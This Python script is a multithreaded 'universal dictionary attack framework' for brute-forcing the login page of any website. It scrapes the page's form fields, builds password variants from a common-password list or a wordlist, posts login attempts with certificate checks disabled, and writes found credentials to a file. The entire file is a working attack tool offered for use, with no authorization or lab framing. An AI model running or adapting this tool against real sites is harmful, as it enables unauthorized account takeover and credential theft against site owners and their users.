#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
UNIVERSAL ADVANCED DICTIONARY ATTACK FRAMEWORK
Dynamic Target Input for Multiple Websites
Author: Security Researcher
"""

import requests
import threading
import queue
import time
import re
from colorama import Fore, Style, init

init(autoreset=True)

class UniversalDictionaryAttack:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.found_password = None
        self.attempts = 0
        self.lock = threading.Lock()
        self.username_field = None
        self.password_field = None
        
        # Common password lists
        self.common_passwords = [
            'admin', 'password', '123456', 'password123', 'admin123',
            '12345678', 'qwerty', '123456789', '12345', '1234',
            '111111', '1234567', 'dragon', '123123', 'baseball',
            'abc123', 'football', 'monkey', 'letmein', 'shadow',
            'master', '666666', 'qwertyuiop', '123321', 'mustang',
            '1234567890', 'michael', '654321', 'superman', '1qaz2wsx',
            '7777777', 'fuckyou', '121212', '000000', 'qazwsx',
            '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer',
            'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer',
            'harley', 'batman', 'andrew', 'tigger', 'sunshine',
            'iloveyou', '2000', 'charlie', 'robert', 'thomas',
            'hockey', 'ranger', 'daniel', 'starwars', 'klaster',
            '112233', 'george', 'computer', 'michelle', 'jessica',
            'pepper', '1111', 'zxcvbn', '555555', '11111111',
            '131313', 'freedom', '777777', 'pass', 'maggie',
            '159753', 'aaaaaa', 'ginger', 'princess', 'joshua',
            'cheese', 'amanda', 'summer', 'love', 'ashley',
            'nicole', 'chelsea', 'biteme', 'matthew', 'access',
            'yankees', '987654321', 'dallas', 'austin', 'thunder',
            'taylor', 'matrix', 'mobilemail', 'mom', 'monitor',
            'monitoring', 'montana', 'moon', 'moscow'
        ]
        
    def print_banner(self):
        """Display attack banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(Fore.RED + r"""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║    ██╗   ██╗███╗   ██╗██╗██╗   ██╗███████╗██████╗ ███████╗██████╗ ███████╗    ║
    ║    ██║   ██║████╗  ██║██║██║   ██║██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ║
    ║    ██║   ██║██╔██╗ ██║██║██║   ██║█████╗  ██████╔╝█████╗  ██║  ██║███████╗    ║
    ║    ██║   ██║██║╚██╗██║██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██╔══╝  ██║  ██║╚════██║    ║
    ║    ╚██████╔╝██║ ╚████║██║ ╚████╔╝ ███████╗██║  ██║███████╗██████╔╝███████║    ║
    ║     ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝    ║
    ║                                                                               ║
    ║                UNIVERSAL DICTIONARY ATTACK FRAMEWORK v2.0                     ║
    ║                   Supports Any Website Login Page                             ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def discover_login_form(self, url):
        """Discover login form fields from any website"""
        print(f"{Fore.CYAN}[*] Discovering login form on: {url}{Style.RESET_ALL}")
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            
            if response.status_code != 200:
                print(f"{Fore.RED}[-] Failed to access URL (Status: {response.status_code}){Style.RESET_ALL}")
                return False
            
            # Find all input fields
            input_pattern = r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>'
            input_fields = re.findall(input_pattern, response.text, re.IGNORECASE)
            
            if not input_fields:
                print(f"{Fore.RED}[-] No input fields found on this page{Style.RESET_ALL}")
                return False
            
            print(f"{Fore.GREEN}[+] Found {len(input_fields)} input fields{Style.RESET_ALL}")
            
            # Identify username/email field
            username_candidates = []
            for field in input_fields:
                field_lower = field.lower()
                if any(keyword in field_lower for keyword in ['user', 'name', 'email', 'login', 'mail']):
                    username_candidates.append(field)
            
            # Identify password field
            password_candidates = []
            for field in input_fields:
                if 'pass' in field.lower():
                    password_candidates.append(field)
            
            # Let user choose or auto-select
            if username_candidates:
                print(f"{Fore.CYAN}[+] Username/Email fields detected:{Style.RESET_ALL}")
                for i, field in enumerate(username_candidates, 1):
                    print(f"   {i}. {field}")
                
                if len(username_candidates) == 1:
                    self.username_field = username_candidates[0]
                    print(f"{Fore.GREEN}[✓] Auto-selected: {self.username_field}{Style.RESET_ALL}")
                else:
                    choice = input(f"{Fore.YELLOW}[?] Select username field (1-{len(username_candidates)}): {Style.RESET_ALL}")
                    try:
                        self.username_field = username_candidates[int(choice)-1]
                    except:
                        self.username_field = username_candidates[0]
            else:
                print(f"{Fore.YELLOW}[!] No clear username field found. Showing all fields:{Style.RESET_ALL}")
                for i, field in enumerate(input_fields[:10], 1):
                    print(f"   {i}. {field}")
                choice = input(f"{Fore.YELLOW}[?] Select username field (1-{min(10, len(input_fields))}): {Style.RESET_ALL}")
                try:
                    self.username_field = input_fields[int(choice)-1]
                except:
                    self.username_field = input_fields[0]
            
            if password_candidates:
                print(f"{Fore.CYAN}[+] Password fields detected:{Style.RESET_ALL}")
                for i, field in enumerate(password_candidates, 1):
                    print(f"   {i}. {field}")
                
                if len(password_candidates) == 1:
                    self.password_field = password_candidates[0]
                    print(f"{Fore.GREEN}[✓] Auto-selected: {self.password_field}{Style.RESET_ALL}")
                else:
                    choice = input(f"{Fore.YELLOW}[?] Select password field (1-{len(password_candidates)}): {Style.RESET_ALL}")
                    try:
                        self.password_field = password_candidates[int(choice)-1]
                    except:
                        self.password_field = password_candidates[0]
            else:
                print(f"{Fore.RED}[-] No password field found!{Style.RESET_ALL}")
                return False
            
            print(f"\n{Fore.GREEN}[+] Login form configuration:{Style.RESET_ALL}")
            print(f"   Username Field: {self.username_field}")
            print(f"   Password Field: {self.password_field}")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error discovering login form: {e}{Style.RESET_ALL}")
            return False
    
    def test_password(self, target_url, username, password):
        """Test a single password"""
        try:
            # Prepare login data
            login_data = {
                self.username_field: username,
                self.password_field: password.strip(),
                'submit': 'Login',
                'login': 'Login'
            }
            
            # Try to login
            response = self.session.post(
                target_url,
                data=login_data,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            
            with self.lock:
                self.attempts += 1
                
                # Advanced success detection
                success_indicators = [
                    'welcome', 'dashboard', 'logout', 'my account',
                    'profile', 'admin', 'success', 'redirecting',
                    'location.replace', 'window.location',
                    'signed in', 'logged in'
                ]
                
                for indicator in success_indicators:
                    if indicator in response.text.lower():
                        self.found_password = password
                        print(f"\n{Fore.GREEN}[+] PASSWORD FOUND: {password}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] Login successful!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[+] Response length: {len(response.text)} chars{Style.RESET_ALL}")
                        return True
                
                # Progress reporting
                if self.attempts % 20 == 0:
                    print(f"{Fore.YELLOW}[*] Attempts: {self.attempts}, Testing: {password}{Style.RESET_ALL}")
                
                return False
                
        except Exception as e:
            with self.lock:
                if self.attempts % 50 == 0:
                    print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
            return False
    
    def worker(self, target_url, username, password_queue):
        """Worker thread for password testing"""
        while not password_queue.empty() and self.found_password is None:
            try:
                password = password_queue.get_nowait()
                if self.test_password(target_url, username, password):
                    break
                password_queue.task_done()
            except queue.Empty:
                break
    
    def load_custom_wordlist(self, filename):
        """Load custom password wordlist"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                print(f"{Fore.CYAN}[*] Loaded {len(passwords)} passwords from {filename}{Style.RESET_ALL}")
                return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Wordlist {filename} not found. Using common passwords.{Style.RESET_ALL}")
            return self.common_passwords
    
    def generate_variations(self, base_passwords, year_suffix=True):
        """Generate password variations"""
        variations = []
        
        for password in base_passwords:
            # Add to variations list
            variations.append(password)
            
            # Capitalize first letter
            variations.append(password.capitalize())
            
            # Add year suffixes if enabled
            if year_suffix:
                years = ['2020', '2021', '2022', '2023', '2024', '2025']
                for year in years:
                    variations.append(password + year)
            
            # Add common suffixes
            suffixes = ['123', '1234', '12345', '!', '@', '#', '$', '%', '?']
            for suffix in suffixes:
                variations.append(password + suffix)
            
            # Leet speak variations
            leet_replacements = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
            leet_password = password
            for old, new in leet_replacements.items():
                leet_password = leet_password.replace(old, new).replace(old.upper(), new)
            variations.append(leet_password)
        
        return list(set(variations))  # Remove duplicates
    
    def get_usernames_to_test(self):
        """Get list of usernames to test"""
        print(f"\n{Fore.CYAN}[*] Username Selection:{Style.RESET_ALL}")
        print("   1. Use 'admin' (default)")
        print("   2. Use 'administrator'")
        print("   3. Use 'root'")
        print("   4. Custom username")
        print("   5. Multiple common usernames")
        
        choice = input(f"{Fore.YELLOW}[?] Select option (1-5): {Style.RESET_ALL}")
        
        if choice == '2':
            return ['administrator']
        elif choice == '3':
            return ['root']
        elif choice == '4':
            custom = input(f"{Fore.YELLOW}[?] Enter custom username: {Style.RESET_ALL}")
            return [custom]
        elif choice == '5':
            return ['admin', 'administrator', 'root', 'test', 'user', 'guest']
        else:
            return ['admin']
    
    def run_attack(self):
        """Run dictionary attack on any website"""
        self.print_banner()
        
        # Get target URL from user
        print(f"\n{Fore.CYAN}[*] Universal Dictionary Attack v2.0{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Supports any website login page{Style.RESET_ALL}")
        
        target_url = input(f"{Fore.YELLOW}[?] Enter target login URL (e.g., https://example.com/login): {Style.RESET_ALL}")
        
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        
        # Discover login form
        if not self.discover_login_form(target_url):
            print(f"{Fore.RED}[-] Cannot proceed without valid login form{Style.RESET_ALL}")
            return
        
        # Get usernames to test
        usernames = self.get_usernames_to_test()
        
        # Password list selection
        print(f"\n{Fore.CYAN}[*] Password Source:{Style.RESET_ALL}")
        print("   1. Use built-in common passwords")
        print("   2. Load from custom wordlist file")
        
        choice = input(f"{Fore.YELLOW}[?] Select option (1-2): {Style.RESET_ALL}")
        
        if choice == '2':
            wordlist_file = input(f"{Fore.YELLOW}[?] Enter wordlist filename: {Style.RESET_ALL}")
            base_passwords = self.load_custom_wordlist(wordlist_file)
        else:
            base_passwords = self.common_passwords
            print(f"{Fore.CYAN}[*] Using {len(base_passwords)} built-in common passwords{Style.RESET_ALL}")
        
        # Ask for password variations
        use_variations = input(f"{Fore.YELLOW}[?] Generate password variations? (y/n): {Style.RESET_ALL}").lower()
        if use_variations == 'y':
            print(f"{Fore.CYAN}[*] Generating password variations...{Style.RESET_ALL}")
            all_passwords = self.generate_variations(base_passwords)
            print(f"{Fore.CYAN}[*] Total passwords to test: {len(all_passwords)}{Style.RESET_ALL}")
        else:
            all_passwords = base_passwords
        
        # Thread configuration
        try:
            threads = int(input(f"{Fore.YELLOW}[?] Number of threads (1-20, default 5): {Style.RESET_ALL}") or "5")
            threads = max(1, min(20, threads))
        except:
            threads = 5
        
        print(f"\n{Fore.YELLOW}[*] Starting attack configuration:{Style.RESET_ALL}")
        print(f"   Target: {target_url}")
        print(f"   Usernames: {', '.join(usernames)}")
        print(f"   Passwords: {len(all_passwords)}")
        print(f"   Threads: {threads}")
        print(f"   Username Field: {self.username_field}")
        print(f"   Password Field: {self.password_field}")
        
        confirm = input(f"\n{Fore.RED}[!] Start attack? (y/n): {Style.RESET_ALL}")
        if confirm.lower() != 'y':
            print(f"{Fore.YELLOW}[*] Attack cancelled{Style.RESET_ALL}")
            return
        
        # Start attack for each username
        for username in usernames:
            if self.found_password:
                break
                
            print(f"\n{Fore.CYAN}[*] Testing username: {username}{Style.RESET_ALL}")
            
            # Create password queue
            password_queue = queue.Queue()
            for password in all_passwords:
                password_queue.put(password)
            
            # Start threads
            start_time = time.time()
            thread_pool = []
            
            print(f"{Fore.YELLOW}[*] Starting attack at {time.strftime('%H:%M:%S')}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
            
            for i in range(threads):
                thread = threading.Thread(target=self.worker, args=(target_url, username, password_queue))
                thread.daemon = True
                thread.start()
                thread_pool.append(thread)
            
            # Wait for completion
            try:
                while any(thread.is_alive() for thread in thread_pool) and self.found_password is None:
                    time.sleep(0.5)
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Attack interrupted by user{Style.RESET_ALL}")
            
            # Calculate statistics
            end_time = time.time()
            duration = end_time - start_time
            rate = self.attempts / duration if duration > 0 else 0
            
            # Print results for this username
            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"║{'ATTACK SUMMARY':^78}║")
            print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            
            print(f"\n{Fore.WHITE}[*] Duration: {duration:.2f} seconds{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[*] Attempts made: {self.attempts}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[*] Rate: {rate:.2f} attempts/second{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[*] Username tested: {username}{Style.RESET_ALL}")
        
        # Final results
        if self.found_password:
            print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
            print(f"║{'SUCCESS! PASSWORD FOUND':^78}║")
            print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            print(f"\n{Fore.GREEN}[+] Target URL: {target_url}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Username Field: {self.username_field}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Password Field: {self.password_field}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found Password: {self.found_password}{Style.RESET_ALL}")
            
            # Save results
            with open('cracked_credentials.txt', 'a') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target: {target_url}\n")
                f.write(f"Username Field: {self.username_field}\n")
                f.write(f"Password Field: {self.password_field}\n")
                f.write(f"Password: {self.found_password}\n")
            
            print(f"{Fore.GREEN}[+] Credentials saved to: cracked_credentials.txt{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] Password not found in dictionary{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Suggestions:{Style.RESET_ALL}")
            print(f"   1. Try a larger wordlist file")
            print(f"   2. Try different username")
            print(f"   3. The website might have strong protection")
            print(f"   4. Check if login form fields are correct")

# Main execution
if __name__ == "__main__":
    import os
    
    attacker = UniversalDictionaryAttack()
    attacker.run_attack()